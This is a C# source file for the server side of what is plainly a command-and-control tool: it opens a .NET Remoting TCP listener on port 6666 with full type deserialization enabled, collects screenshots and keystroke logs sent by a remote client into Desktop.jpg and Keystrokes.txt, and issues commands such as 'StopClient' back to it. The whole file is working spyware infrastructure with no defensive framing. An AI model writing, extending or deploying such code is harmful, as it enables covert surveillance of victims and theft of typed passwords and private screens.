using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using RemotingInterface;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace CommandControlServer
{
    internal class RemoteDesktop
    {
        public static TextBox tb3 = null;
        public static PictureBox picbox = null;
        public static ToolStripStatusLabel tsl = null;

        public static void initRemoteDesktop(TextBox tb3In, PictureBox picboxIn, ToolStripStatusLabel tslIn)
        {
            tb3 = tb3In;
            picbox = picboxIn;
            tsl = tslIn;

            BinaryServerFormatterSinkProvider provider = new BinaryServerFormatterSinkProvider();
            provider.TypeFilterLevel = System.Runtime.Serialization.Formatters.TypeFilterLevel.Full;
            System.Collections.Hashtable props = new System.Collections.Hashtable();
            //props["port"] = 666;
            props.Add("port", 6666);

            TcpChannel chan = new TcpChannel(props, null, provider);
            ChannelServices.RegisterChannel(chan, false);
            RemotingConfiguration.RegisterWellKnownServiceType(
            typeof(DesktopServer), //type
            "DesktopCapture", //uri
            WellKnownObjectMode.SingleCall);
        }

        public class DesktopServer : MarshalByRefObject, DesktopInterface
        {
            public void HelloMethod(String name)
            {
                using (StreamWriter sw = File.CreateText("Hello.txt"))
                {
                    sw.WriteLine("Hello" + name);
                }
            }
            public void GoodbyeMethod()
            {
                using (StreamWriter sw = File.CreateText("Bye.txt"))
                {
                    sw.WriteLine("GoodBye");
                }
            }
            public void SendBitmap(MemoryStream memoryStream)
            {
                Bitmap b = new Bitmap(memoryStream);
                b.Save("Desktop.jpg", ImageFormat.Jpeg);
            }

            public string GetCommands()
            {
                string commands;
                bool bFileExists = File.Exists("DoCommands.txt");
                if (bFileExists)
                {
                    using (StreamReader sr = File.OpenText("DoCommands.txt"))
                    {
                        commands = sr.ReadLine();
                    }

                    File.Delete("DoCommands.txt");
                    tsl.Text = "Connection closed via Button Stop Client";
                    return commands;
                }
                else return "Continue";
            }

            public void SendKeystrokes(String keylog)
            {
                using (StreamWriter sw = File.CreateText("Keystrokes.txt"))
                {
                    sw.WriteLine(keylog);
                }
            }

        }

        //--Hello
        public static void btn5_click()
        {
            bool bFileExists = File.Exists("Hello.txt");
            if (bFileExists)
            {
                using (StreamReader sr = File.OpenText("Hello.txt"))
                {
                    string s = "";
                    while ((s = sr.ReadLine()) != null)
                    {
                        tb3.Text = s;
                    }
                }
            }
        }

        //--Bye 
        public static void btn6_click()
        {
            bool bFileExists = File.Exists("Bye.txt");
            if (bFileExists)
            {
                using (StreamReader sr = File.OpenText("Bye.txt"))
                {
                    string s = "";
                    while ((s = sr.ReadLine()) != null)
                    {
                        tb3.Text = s;
                    }
                }
            }
        }

        //--Picture
        public static void btn7_click()
        {
            bool bFileExists = File.Exists("Desktop.jpg");
            if (bFileExists)
            {
                picbox.ImageLocation = "Desktop.jpg";
            }
        }

        //--Stop Client
        public static void btn8_click()
        {
            using (StreamWriter sw = File.CreateText("DoCommands.txt"))
            {
                sw.WriteLine("StopClient");
            }
        }


    }
}
